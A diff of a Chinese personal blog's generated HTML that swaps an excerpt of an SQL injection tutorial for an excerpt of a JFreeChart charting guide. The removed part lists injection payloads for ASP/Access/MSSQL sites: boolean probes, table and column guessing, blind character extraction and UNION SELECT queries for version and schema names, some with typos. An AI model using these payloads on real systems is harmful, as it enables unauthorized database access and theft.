@@ -89,7 +89,7 @@
 <meta name="description" content="WELCOME TO MY TINY WORKSPACE!!!">
 <meta property="og:type" content="website">
 <meta property="og:title" content="个人博客">
-<meta property="og:url" content="http://burinicc.cn/index.html">
+<meta property="og:url" content="http://burinicc.cn/page/6/index.html">
 <meta property="og:site_name" content="个人博客">
 <meta property="og:description" content="WELCOME TO MY TINY WORKSPACE!!!">
 <meta name="twitter:card" content="summary">
@@ -122,7 +122,7 @@
 
 
 
-  <link rel="canonical" href="http://burinicc.cn/"/>
+  <link rel="canonical" href="http://burinicc.cn/page/6/"/>
 
 
 
@@ -304,7 +304,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://burinicc.cn/2016/12/01/sql注入问题详解/">
+  <link itemprop="mainEntityOfPage" href="http://burinicc.cn/2016/12/01/jfreechar使用说明书/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="burini">
@@ -329,8 +329,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/12/01/sql注入问题详解/" itemprop="url">
-                  sql注入问题详解
+                <a class="post-title-link" href="/2016/12/01/jfreechar使用说明书/" itemprop="url">
+                  jfreechar使用说明书
                 </a>
               
             
@@ -344,7 +344,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-01T11:23:39+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-01T10:17:53+08:00">
                 2016-12-01
               </time>
             
@@ -360,8 +360,8 @@
             
               <span class="post-comments-count">
                 <span class="post-meta-divider">|</span>
-                <a href="/2016/12/01/sql注入问题详解/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/01/sql注入问题详解/" itemprop="commentCount"></span>
+                <a href="/2016/12/01/jfreechar使用说明书/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/01/jfreechar使用说明书/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -388,53 +388,10 @@
 
       
         
-          <p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。<br>SQL注入基础<br>1.试探 1=1，1=2</p>
-<pre><code>http://example.asp?id=49
-http://example.asp?id=49 and 1=1
-http://example.asp?id=49 and 1=2
-</code></pre><p>可以注入的表现：</p>
-<pre><code>正常显示
-正常显示
-提示BOF或EOF
-</code></pre><p>不可注入的表现：</p>
-<pre><code>正常显示
-程序定义的错误提示或提示类型转换时出错。
-同上
-</code></pre><p>2.判断数据库类型<br>加单引号</p>
-<pre><code>错误提示含有JET（JET是ACCESS数据库的数据库引擎）
-错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）
-</code></pre><p>and user &gt; 0</p>
-<p>SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。</p>
-<p>ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。<br>and (select count (*) from sysobjects) &gt; 0</p>
-<p>SQL SERVER显示正常。ACCESS显示出错。<br>and (select count (*) from msysobjects) &gt; 0</p>
-<p>SQL SERVER显示正常。ACCESS显示没有权限。<br>3.猜表名</p>
-<p>and (select count (*) from admin) &gt;= 0<br>返回正常说明admin存在<br>4.猜字段</p>
-<p>and (select count (content) from admin) &gt;= 0<br>返回正常说明content字段存在</p>
-<p>常用的猜字段函数<br>ACCESS: asc(字符) 返回字符的ascii<br>MSSQL: unicode(字符) 同上<br>ACCESS: char(数字) 返回ascii的字符<br>MSSQL: nchar()同上<br>ACCESS: mid(字符串,N,L) 返回字符串从N个字符起，长度为L的子字符串<br>MSSQL: substring(字符串,N,L) 同上<br>ACCESS,MSSQL: abc(数字) 返回数字的绝对值（猜汉字使用）<br>ACCESS,MSSQL: A between B and C 判断A是否在B和C之间</p>
-<p>例and (select asc(mind(password,1,1))from admin) &gt; 100<br>查询admin中password字段第1个字符串的ascii是否大于100</p>
-<p>例select <em> from article where articleid = ‘’ union select </em> from user where userid = 1<br>第一个select执行后返回结果title content<br>select <em> from article where articleid = ‘’<br>第二个select执行后返回结果username password<br>select </em> from user where userid = 1<br>整个select执行后返回结果username password<br>如果前面查询为真，则同时返回两次查询的内容</p>
-<pre><code>判断字段个数order by
-查表名and (select count (*) from admin) &gt;= 0
-猜测admin表的字段个数（假如有三个字段id,user,password）union select 1,2,3,4,5,6,7,8,9,10,* from admin返回错误，union select 1,2,3,* from admin返回正常
-</code></pre><p>inner join on: 指定返回两个表中匹配的行<br>select * from admin as a inner join admin as b on a.id = b.id返回一个表中的两个内容</p>
-<p>上方3中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id</p>
-<p>select * from admin inner join admin1 on admin.id = admin1.id返回两个表内容<br>MSSQL</p>
-<pre><code>判断字段个数order by 13
-判断字段回显位and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13
-数据库版本and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13
-当前数据库名and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13
-所有数据库名（通过更改dbid，7以上的是用户数据库）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --
-表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
-字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
-根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
-</code></pre><p>ASSESS<br>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/12/01/sql注入问题详解/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <p>思路：<br>在action代码中，生成图形，把图片的名称暂存到session中，在页面中通过img展示生成的图形，通过jfreechart的servlet输出图形<br>解决方案：<br>一、导入jar包：<br>jcommns.jar<br>jfreechart.jar<br>二、配置jfreechart的servlet<br>    &lt;!-jfreechart –&gt;<br>    org.jfree.chart.servlet.DisplayChart<br>三、Action中配置:<br>第一步：准备dataset<br>DefaultCategoryDataset dataset=new DefaultCategoryDataset();<br>        for (YycgdmxCustom yycgdmxCustom : list) {<br>            //第一个参数：统计数值，第二个参数：统计指标名称，第三个参数：统计分类<br>            dataset.addValue(yycgdmxCustom.getCgje(), “采购金额”, yycgdmxCustom.getAreaname());<br>        }<br>        for (YycgdmxCustom yycgdmxCustom : list) {<br>            //第一个参数：统计数值，第二个参数：统计指标名称，第三个参数：统计分类<br>            dataset.addValue(yycgdmxCustom.getCgl(), “采购量”, yycgdmxCustom.getAreaname());<br>        }<br>解决中文乱码：<br>//创建主题样式<br>           StandardChartTheme standardChartTheme=new StandardChartTheme(“CN”);<br>           //设置标题字体<br>           standardChartTheme.setExtraLargeFont(new Font(“隶书”,Font.BOLD,20));<br>           //设置图例的字体<br>           standardChartTheme.setRegularFont(new Font(“宋书”,Font.PLAIN,15));<br>           //设置轴向的字体<br>           standardChartTheme.setLargeFont(new Font(“宋书”,Font.PLAIN,15));<br>           //应用主题样式<br>           ChartFactory.setChartTheme(standardChartTheme);<br>第二步：创建chart<br>柱状图：<br>JFreeChart chart=ChartFactory.createBarChart3D(“药品采购金额汇总”,//图形名称<br>                “”,//分类名称，为横坐标名称<br>                “采购金额”,//值名称，为纵坐标名称<br>                dataset,//数据集合<br>                PlotOrientation.VERTICAL,//垂直显示<br>                true,//是否显示图例<br>                false,//是否使用工具提示<br>                false);//是否使用url<br>        //在柱上显示数值<br>        CategoryPlot plot=chart.getCategoryPlot();<br>        BarRenderer3D renderer=new BarRenderer3D();<br>        //设置柱的颜色<br>        renderer.setSeriesPaint(0, Color.decode(“#ffffff”));<br>        renderer.setBaseItemLabelGenerator(new StandardCategoryItemLabelGenerator());<br>        renderer.setBaseItemLabelsVisible(true);<br>        //默认的数字显示在柱中，通过下面两句可以调整数字的显示位置<br>        renderer.setBasePositiveItemLabelPosition(new ItemLabelPosition(ItemLabelAnchor.OUTSIDE12, TextAnchor.BASELINE_LEFT));<br>        renderer.setItemLabelAnchorOffset(10D);<br>        plot.setRenderer(renderer);<br>第三步：将jfreechart得到的文件名传到页面<br>//将chart注入到jfreechart的工具中得到filename，把图片保存在session中，并把filename传到页面。<br>        String jfreechart_filename=<br>        ServletUtilities.saveChartAsPNG(chart,900,500,null,session);        model.addAttribute(“jfreechart_filename”,jfreechart_filename);<br>四、配置jsp页面<br>&lt;!—jfreechart图形–&gt;<br>在jsp页面添加img标签 属性src=”${baseurl}/jfreechart?filename=${jfreechart_filename}”</p>
+
+          
         
       
     </div>
@@ -466,7 +423,7 @@ http://example.asp?id=49 and 1=2
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
   </nav>
 
 
